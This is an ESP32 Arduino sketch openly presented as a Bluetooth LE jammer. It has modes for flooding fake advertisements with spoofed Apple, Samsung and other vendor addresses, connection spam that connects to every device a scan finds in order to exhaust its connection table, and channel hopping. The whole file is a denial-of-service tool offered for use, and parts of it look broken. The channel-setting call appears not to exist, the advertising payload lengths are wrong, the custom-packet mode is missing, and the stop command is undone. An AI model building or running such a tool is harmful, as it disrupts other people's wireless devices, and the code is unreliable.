
/*
   * ESP32 BLE Jammer — Beacon Flood + Connection Spam + Channel Hop
   * Author: Akshay G Babu
   * License: MIT
   *
   * Hardware: ESP32 DevKit V1 / ESP32-C3
   *
   * Modes:
   *   1. Beacon Flood  — Advertise 100s of fake devices
   *   2. Connection Spam — Initiate connections to exhaust target resources
   *   3. Channel Hop    — Sweep all 3 BLE advertising channels (37, 38, 39)
   *   4. Custom PDU     — Inject raw advertising packets
   */

  #include <Arduino.h>
  #include <esp_bt.h>
  #include <esp_gap_ble_api.h>
  #include <esp_bt_main.h>
  #include <esp_bt_device.h>

  // ==================== CONFIG ====================
  #define MODE_BEACON_FLOOD   1
  #define MODE_CONN_SPAM      2
  #define MODE_CHANNEL_HOP    3
  #define MODE_CUSTOM_PDU     4

  int currentMode = MODE_BEACON_FLOOD;
  bool jammerActive = false;

  // BLE Advertising channels (2.4 GHz)
  const uint8_t bleChannels[3] = {37, 38, 39};  // 2402, 2426, 2480 MHz
  uint8_t currentChannel = 0;

  // Fake device prefixes (OUI)
  const uint8_t fakeOUIs[][3] = {
    {0x00, 0x1A, 0x7D},  // Apple
    {0x00, 0x1B, 0x44},  // Samsung
    {0x00, 0x26, 0xBB},  // Google
    {0x00, 0x0C, 0x6E},  // Microsoft
    {0xA4, 0xC1, 0x38},  // Xiaomi
    {0x3C, 0x28, 0x6D},  // Fitbit
  };

  // ==================== UTILITIES ====================
  void setChannel(uint8_t ch) {
    esp_bt_controller_set_channel(ch);
    currentChannel = ch;
  }

  void randomMac(uint8_t* mac) {
    memcpy(mac, fakeOUIs[random(0, 6)], 3);
    for (int i = 3; i < 6; i++) mac[i] = random(0, 256);
  }

  // ==================== BEACON FLOOD ====================
  void beaconFlood() {
    esp_ble_adv_params_t advParams = {
      .adv_int_min = 0x20,   // 20ms min interval
      .adv_int_max = 0x30,   // 30ms max interval
      .adv_type = ADV_TYPE_NONCONN_IND,
      .own_addr_type = BLE_ADDR_TYPE_RANDOM,
      .channel_map = ADV_CHNL_ALL,
      .adv_filter_policy = ADV_FILTER_ALLOW_SCAN_ANY_CON_ANY,
    };

    uint8_t mac[6];
    randomMac(mac);
    esp_ble_gap_set_rand_addr(mac);

    // Minimal advertisement data: Flags + Random name
    uint8_t advData[31] = {
      0x02, 0x01, 0x06,                    // Flags: LE General Discoverable
      0x0B, 0x09, 'B','T','-','D','e','v' // Name: "BT-Dev" + random
    };
    advData[5] = random(0x30, 0x7A);       // Random char
    advData[6] = random(0x30, 0x7A);
    advData[7] = random(0x30, 0x7A);

    esp_ble_gap_config_adv_data_raw(advData, 8);
    esp_ble_gap_start_advertising(&advParams);
  }

  // ==================== CONNECTION SPAM ====================
  void connectionSpam() {
    // Initiate connections to exhaust target's connection table
    // Requires target MAC — in practice, scan first then spam
    // This is a placeholder for connection initiation logic
    esp_ble_gap_set_scan_params(
      &(esp_ble_scan_params_t){
        .scan_type = BLE_SCAN_TYPE_ACTIVE,
        .own_addr_type = BLE_ADDR_TYPE_RANDOM,
        .scan_filter_policy = BLE_SCAN_FILTER_ALLOW_ALL,
        .scan_interval = 0x50,
        .scan_window = 0x30,
        .scan_duplicate = BLE_SCAN_DUPLICATE_DISABLE
      }
    );
    esp_ble_gap_start_scanning(0);  // Continuous
  }

  // ==================== CHANNEL HOP ====================
  void channelHop() {
    static unsigned long lastHop = 0;
    if (millis() - lastHop > 100) {  // Hop every 100ms
      setChannel(bleChannels[currentChannel]);
      currentChannel = (currentChannel + 1) % 3;
      lastHop = millis();
    }
  }

  // ==================== GAP EVENT HANDLER ====================
  void gapEventHandler(esp_gap_ble_cb_event_t event, esp_ble_gap_cb_param_t* param) {
    switch (event) {
      case ESP_GAP_BLE_ADV_DATA_RAW_SET_COMPLETE_EVT:
        if (jammerActive && currentMode == MODE_BEACON_FLOOD) {
          beaconFlood();  // Restart with new MAC
        }
        break;
      case ESP_GAP_BLE_SCAN_RESULT_EVT:
        if (currentMode == MODE_CONN_SPAM) {
          // Found target — initiate connection
          esp_ble_gap_create_conn(
            param->scan_rst.bda,
            BLE_ADDR_TYPE_PUBLIC,
            &(esp_conn_params_t){
              .interval_min = 0x10,
              .interval_max = 0x20,
              .latency = 0,
              .timeout = 0xC80
            }
          );
        }
        break;
      default:
        break;
    }
  }

  // ==================== SETUP ====================
  void setup() {
    Serial.begin(115200);
    delay(1000);
    Serial.println("\n=== ESP32 BLE Jammer ===");
    Serial.println("Modes: 1=Beacon Flood, 2=Conn Spam, 3=Channel Hop, 4=Custom PDU");

    // Initialize Bluetooth controller
    esp_bt_controller_config_t btCfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    esp_bt_controller_init(&btCfg);
    esp_bt_controller_enable(ESP_BT_MODE_BLE);
    esp_bluedroid_init();
    esp_bluedroid_enable();
    esp_ble_gap_register_callback(gapEventHandler);

    // Default: Beacon Flood
    setChannel(37);
    jammerActive = true;
    beaconFlood();
  }

  // ==================== LOOP ====================
  void loop() {
    // Serial command interface
    if (Serial.available()) {
      char cmd = Serial.read();
      jammerActive = false;
      esp_ble_gap_stop_advertising();
      esp_ble_gap_stop_scanning();

      switch (cmd) {
        case '1': currentMode = MODE_BEACON_FLOOD;   Serial.println("Mode: Beacon Flood");   break;
        case '2': currentMode = MODE_CONN_SPAM;      Serial.println("Mode: Connection Spam"); break;
        case '3': currentMode = MODE_CHANNEL_HOP;    Serial.println("Mode: Channel Hop");     break;
        case '4': currentMode = MODE_CUSTOM_PDU;     Serial.println("Mode: Custom PDU");      break;
        case 's': jammerActive = false;              Serial.println("STOPPED");              break;
        case 'r': jammerActive = true;               Serial.println("RESUMED");              break;
        default:  return;
      }

      jammerActive = true;
      if (currentMode == MODE_BEACON_FLOOD) beaconFlood();
      else if (currentMode == MODE_CONN_SPAM) connectionSpam();
    }

    if (jammerActive && currentMode == MODE_CHANNEL_HOP) {
      channelHop();
    }

    delay(10);
  }

  ---
